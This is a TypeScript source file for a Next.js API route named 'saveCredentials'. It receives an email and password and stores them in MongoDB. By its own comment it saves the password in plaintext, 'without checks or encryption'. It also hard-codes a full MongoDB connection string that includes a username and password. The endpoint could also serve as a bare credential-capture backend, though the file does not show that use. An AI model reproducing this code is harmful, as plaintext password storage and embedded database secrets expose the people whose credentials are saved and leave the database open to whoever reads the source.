// src/app/api/saveCredentials/route.ts
import { NextResponse } from 'next/server';
import mongoose from 'mongoose';

const MONGODB_URI = "mongodb+srv://gamer2mohamad:12er56ui90@cluster0.zvvocvd.mongodb.net/your-database-name"; // Replace with your MongoDB URI

// Mongoose User Schema
const UserSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
});

const User = mongoose.models.User || mongoose.model('User', UserSchema);

// Function to connect to the database
async function dbConnect() {
  if (mongoose.connection.readyState >= 1) {
    return;
  }

  await mongoose.connect(MONGODB_URI);
}

// API route handler
export async function POST(request: Request) {
  const { email, password } = await request.json();

  if (!email || !password) {
    return NextResponse.json({ error: 'Email and password are required.' }, { status: 400 });
  }

  try {
    await dbConnect(); // Connect to the database

    // Save the user credentials without checks or encryption
    const newUser = new User({ email, password });
    await newUser.save();

    return NextResponse.json({ message: 'Credentials saved successfully.' });
  } catch (error) {
    console.error('Error saving credentials:', error);
    return NextResponse.json({ error: 'Failed to save credentials.' }, { status: 500 });
  }
}
